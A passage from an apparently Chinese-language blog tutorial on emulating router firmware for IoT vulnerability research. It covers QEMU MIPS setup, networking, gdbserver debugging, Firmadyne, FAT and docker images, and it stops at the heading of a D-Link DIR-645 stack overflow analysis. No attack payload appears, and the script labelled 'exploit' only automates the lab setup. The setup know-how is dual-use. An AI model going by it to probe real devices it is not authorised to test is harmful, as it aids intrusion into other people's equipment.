class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sda1 console=tty0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Debian GNU/Linux 6.0 debian-mips ttyS0</span><br><span class="line">debian-mips login: root</span><br><span class="line">Password: </span><br><span class="line">Last login: Wed Jul  8 05:16:50 UTC 2020 on ttyS0</span><br><span class="line">Linux debian-mips 2.6.32-5-4kc-malta <span class="comment">#1 Tue Sep 24 00:02:22 UTC 2013 mips</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig </span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:2988 (2.9 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:9 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:9 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:672 (672.0 B)  TX bytes:672 (672.0 B)</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.164.140/24</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig </span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          inet addr:192.168.164.140  Bcast:192.168.164.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:87 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:5220 (5.0 KiB)  TX bytes:2988 (2.9 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:9 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:9 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:672 (672.0 B)  TX bytes:672 (672.0 B)</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ping 192.168.164.139</span></span><br><span class="line">PING 192.168.164.139 (192.168.164.139) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.164.139: icmp_req=1 ttl=64 time=14.7 ms</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ping 192.168.164.137</span></span><br><span class="line">PING 192.168.164.137 (192.168.164.137) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.164.137: icmp_req=1 ttl=64 time=2.28 ms</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">-M 指定开发板 你能够使用-M ?參数来获取该qemu版本号支持的全部单板</span><br><span class="line">-kernel 内核镜像路径</span><br><span class="line">-hda/-hdb IDE硬盘镜像</span><br><span class="line">-append 内核启动参数 内核命令行</span><br><span class="line">-s 等同于-g 1234</span><br></pre></td></tr></table></figure><p>然后在物理机用python启动一个简单的ftp服务器，在虚拟机里面接受固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf squashfs-root.tar squashfs-root/</span><br><span class="line">$ python -m SimpleHTTPServer 8888</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8888 ...</span><br><span class="line">192.168.164.140 - - [08/Jul/2020 00:33:18] <span class="string">"GET /squashfs-root.tar HTTP/1.0"</span> 200</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># wget http://192.168.164.137:8888/squashfs-root.tar</span></span><br><span class="line">--2020-07-08 07:33:18--  http://192.168.164.137:8888/squashfs-root.tar</span><br><span class="line">Connecting to 192.168.164.137:8888... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 29675520 (28M) [application/x-tar]</span><br><span class="line">Saving to: “squashfs-root.tar”</span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 29,675,520  2.96M/s   <span class="keyword">in</span> 8.0s    </span><br><span class="line"></span><br><span class="line">2020-07-08 07:33:26 (3.53 MB/s) - “squashfs-root.tar” saved [29675520/29675520]</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ls</span></span><br><span class="line">squashfs-root.tar</span><br><span class="line">root@debian-mips:~<span class="comment"># tar -xvf squashfs-root.tar</span></span><br></pre></td></tr></table></figure><p>最后挂载文件，就可以开启固件里面的服务了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o <span class="built_in">bind</span> /dev/ ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line">chroot ./squashfs-root sh</span><br></pre></td></tr></table></figure><p>以上配置网络的方法访问不了外网，而且手动配置的ip可能会失效，需要重新配置。</p><p>启动gdb和gdbserver开始调试</p><p>在qemu虚拟机里面运行下面的命令来启动调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdbserver.mipsbe attach 0.0.0.0:12345 pid</span><br><span class="line">或者 </span><br><span class="line">gdbserver.mipsbe 0.0.0.0:6666 ./test</span><br></pre></td></tr></table></figure><p>在Ubuntu主机里面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">gef➤ <span class="built_in">set</span> architecture mips      设置架构gdb-multiarch</span><br><span class="line">gef➤ <span class="built_in">set</span> architecture mips      设置架构</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gef➤ gef-remote -q 192.168.1.20:2333     远程链接    或者target remote 192.168.1.20:2333</span><br><span class="line">gef➤ handle SIG32 pass            忽略一些信号，不然gdb会到处停很难受</span><br><span class="line">gef➤ handle SIG33 pass</span><br><span class="line">gef➤ handle SIG43 pass</span><br></pre></td></tr></table></figure><p>我把上述过程写了脚本方便启动</p><h4 id="start-py"><a href="#start-py" class="headerlink" title="start.py"></a>start.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">cmd = <span class="string">'# '</span></span><br><span class="line">current_path = os.getcwd()</span><br><span class="line">firware_path=<span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/vulfirmware/example1/_dir645_FW_103.bin.extracted/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'login: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Password: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'ifconfig eth0 192.168.1.1'</span>)</span><br><span class="line">    r2=process(<span class="string">'sh'</span>)</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'cd &#123;&#125;'</span>.format(firware_path))</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'tar -cvf squashfs-root.tar squashfs-root/'</span>)</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'python -m SimpleHTTPServer 8888'</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'wget http://192.168.1.2:8888/squashfs-root.tar'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'tar -xvf squashfs-root.tar'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'mount -o bind /dev/ ./squashfs-root/dev/'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'mount -t proc /proc/ ./squashfs-root/proc/'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chroot ./squashfs-root sh'</span>)</span><br><span class="line">    r2.close()</span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    os.system(<span class="string">'sudo tunctl -t tap0 -u iot'</span>)</span><br><span class="line">    os.system(<span class="string">'sudo ifconfig tap0 192.168.1.2/24'</span>)</span><br><span class="line"></span><br><span class="line">    exploit(process(<span class="string">'./run.sh'</span>))</span><br></pre></td></tr></table></figure><h4 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">qemu-system-mipsel -M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">"root=/dev/sda1 console=tty0"</span> \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><h4 id="配置qemu-system网络"><a href="#配置qemu-system网络" class="headerlink" title="配置qemu-system网络"></a>配置qemu-system网络</h4><p>qemu想要访问外网，只需再创建一个网桥，将tap0接口添加到网桥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install uml-utilities bridge-utils</span><br></pre></td></tr></table></figure><p>创建网桥，名字是 <code>virbr0</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr virbr0 </span><br><span class="line">sudo ifconfig virbr0 192.168.122.1/24 up</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; sudo brctl addbr virbr0</span><br><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; sudo ifconfig virbr0 192.168.122.1/24 up</span><br><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 135232  bytes 156937910 (156.9 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 45471  bytes 2897770 (2.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 10571  bytes 1888940 (1.8 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 10571  bytes 1888940 (1.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">virbr0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line">        inet6 fe80::a061:b2ff:fea9:466d  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether a2:61:b2:a9:46:6d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 22  bytes 2766 (2.7 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>创建 <code>tap</code> 接口，名字为 <code>tap0</code>，并添加到网桥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 </span><br><span class="line">sudo ifconfig tap0 192.168.122.11/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br></pre></td></tr></table></figure><p>修改主机网络接口配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>如果网卡名不是eth0换成对应网卡名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto virbr0</span><br><span class="line">iface virbr0 inet dhcp</span><br><span class="line">   bridge_ports eth0</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure><p>启动qemu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sda1 console=tty0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><p>然后配置ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.122.12/24 up</span><br></pre></td></tr></table></figure><p>接下来就可以访问外网了</p><h3 id="Firmadyne"><a href="#Firmadyne" class="headerlink" title="Firmadyne"></a>Firmadyne</h3><p>Firmadyne依赖于binwalk，qemu，这个工具可以简化模拟路由器的流程，但不可以调试固件</p><p>将项目克隆下来，并执行setup.sh脚本，会安装所依赖的库和环境，并配置postgresql数据库，数据库用户和密码都为<code>firmadyne</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/firmadyne/firmadyne.git</span><br><span class="line">$ <span class="built_in">cd</span> firmadyne &amp;&amp; sudo ./setup.sh</span><br></pre></td></tr></table></figure><p>firmadyne工作流程如下：</p><p>用extractor 提取filesystem，并存储在数据库里和images目录下 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./sources/extractor/extractor.py -b dlink -sql 127.0.0.1 -np -nk <span class="string">"DIR823GA1_FW102B03.bin"</span> images</span><br><span class="line">&gt;&gt; Database Image ID: 1</span><br><span class="line"></span><br><span class="line">/home/iot/tools/firmware-analysis-toolkit/firmadyne/DIR823GA1_FW102B03.bin</span><br><span class="line">&gt;&gt; MD5: 064dd035f7e7be72949166c37f5dd432</span><br><span class="line">&gt;&gt; Tag: 1</span><br><span class="line">&gt;&gt; Temp: /tmp/tmp6s25ib68</span><br><span class="line">&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True</span><br><span class="line">&gt;&gt; Recursing into archive ...</span><br><span class="line">&gt;&gt;&gt;&gt; Squashfs filesystem, little endian, version 4.0, compression:xz, size: 4006046 bytes, 917 inodes, blocksize: 131072 bytes, created: 2038-02-22 10:46:24</span><br><span class="line">&gt;&gt;&gt;&gt; Found Linux filesystem <span class="keyword">in</span> /tmp/tmp6s25ib68/_DIR823GA1_FW102B03.bin.extracted/squashfs-root!</span><br><span class="line">&gt;&gt; Skipping: completed!</span><br><span class="line">&gt;&gt; Cleaning up /tmp/tmp6s25ib68...</span><br><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ls images/</span><br><span class="line">1.tar.gz  README.md</span><br></pre></td></tr></table></figure><p>识别固件架构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/getArch.sh ./images/1.tar.gz</span><br><span class="line">./bin/busybox: mipsel</span><br></pre></td></tr></table></figure><p>将固件系统内容存储到数据库的image表中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/tar2db.py -i 1 -f ./images/1.tar.gz</span><br></pre></td></tr></table></figure><p>为固件创建qemu磁盘镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; sudo -SE ./scripts/makeImage.sh 1 mipsel</span><br><span class="line">----Running----</span><br><span class="line">----Copying Filesystem Tarball----</span><br><span class="line">----Creating QEMU Image----</span><br><span class="line">Formatting <span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/scratch//1//image.raw'</span>, fmt=raw size=1073741824</span><br><span class="line">----Creating Partition Table----</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.31.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>为qemu建立虚拟接口，并生成run.sh脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/inferNetwork.sh 1 mipsel</span><br><span class="line">Running firmware 1: terminating after 60 secs...</span><br><span class="line"></span><br><span class="line">qemu-system-mipsel: terminating on signal 2 from pid 25160 (timeout)</span><br><span class="line">Inferring network...</span><br><span class="line">Interfaces: [(<span class="string">'br0'</span>, <span class="string">'192.168.0.1'</span>), (<span class="string">'br1'</span>, <span class="string">'192.168.100.1'</span>)]</span><br><span class="line">Done!</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ls scratch/1/</span><br><span class="line">image/  image.raw  qemu.initial.serial.log  run.sh*</span><br></pre></td></tr></table></figure><p>使用指定的网络配置模拟运行固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; sudo ./scratch/1/run.sh </span><br><span class="line">Creating TAP device tap1_0...</span><br><span class="line">Set <span class="string">'tap1_0'</span> persistent and owned by uid 0</span><br><span class="line">Bringing up TAP device...</span><br><span class="line">Adding route to 192.168.0.1...</span><br><span class="line">Starting firmware emulation... use Ctrl<span class="_">-a</span> + x to <span class="built_in">exit</span></span><br><span class="line">[    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) <span class="comment">#1 Thu Feb 18 01:44:57 UTC 2016</span></span><br></pre></td></tr></table></figure><p>系统运行成功，主机可以访问，日志记录到<code>./scratch/1/qemu.final.serial.log</code>中</p><p><img alt="image-20200709102510641" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200709102510641.png" class="lozad"></p><p>总结 ：</p><p>firmadyne简化了固件模拟的流程，并自动配置网络。其内部工作原理和qemu-system一样，配置网络的过程也是用tunctl 来添加虚拟网卡。方便的是会生成qemu镜像，并把固件信息保存到了数据库里，下一次使用会更加方便些。</p><h3 id="Fat"><a href="#Fat" class="headerlink" title="Fat"></a>Fat</h3><p>fat只需一条命令就可以模拟路由器固件，他是把firmadyne的流程更简化了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit</span><br><span class="line"><span class="built_in">cd</span> firmware-analysis-toolkit</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>但安装不容易成功，主要是依赖的东西太多了，可以使用attifyOs虚拟机，里面已经集成好了。</p><p>一条命名即可模拟路由器固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fat.py DIR823GA1_FW102B03.bin</span><br></pre></td></tr></table></figure><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>docker是真的香啊，什么环境都有别人搭好的，参考<a href="https://hub.docker.com/r/waveburst/" target="_blank" rel="noopener">https://hub.docker.com/r/waveburst/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull waveburst/qemu-system-mips</span><br><span class="line">sudo docker pull waveburst/qemu-system-mipsel</span><br><span class="line">sudo docker pull waveburst/qemu-system-armhf</span><br><span class="line">sudo docker pull waveburst/qemu-system-armel</span><br></pre></td></tr></table></figure><p>使用如下：</p><p>First you need to run the container with port mapped to 5555 for ssh control.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 5555:5555 waveburst/qemu-system-mips</span><br></pre></td></tr></table></figure><p>Now you can simply log in to your container using ‘<code>mips:mips</code>‘ credentials</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 5555 mips@localhost</span><br></pre></td></tr></table></figure><p>You can verity that you are inside the qemu-system simply by executing ‘<code>uname -a</code>‘ command. It should return:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux docker-mips-debian 4.9.0-8-4kc-malta #1 Debian 4.9.130-2 (2018-10-27) mips GNU/Linux</span><br></pre></td></tr></table></figure><h2 id="OpenWRT"><a href="#OpenWRT" class="headerlink" title="OpenWRT"></a>OpenWRT</h2><p>OpenWRT是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，常常被用于工控设备、电话、小型机器人、智能家居、路由器以及VOIP设备中。 同时，它还提供了100多个已编译好的软件，而且数量还在不断增加，而 OpenWrt SDK 更简化了开发软件的工序</p><p>而且OpenWRT支持各种处理器架构，无论是对ARM，X86，PowerPC或者MIPS都有很好的支持。</p><p><img alt="image-20200709171345194" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200709171345194.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M virt -m 64 -kernel zImage-initramfs -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><h2 id="IOT常见漏洞"><a href="#IOT常见漏洞" class="headerlink" title="IOT常见漏洞"></a>IOT常见漏洞</h2><p><img alt="image-20200710092958488" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710092958488.png" class="lozad"></p><h2 id="D-Link-DIR-645栈溢出分析"><a href="#D-Link-DIR-645栈溢出分析" class="headerlink" title="D-Link DIR-645栈溢出分析"></a>D-Link DIR-645栈溢出分析</h2><p>漏洞描述</p><figure class="highlight 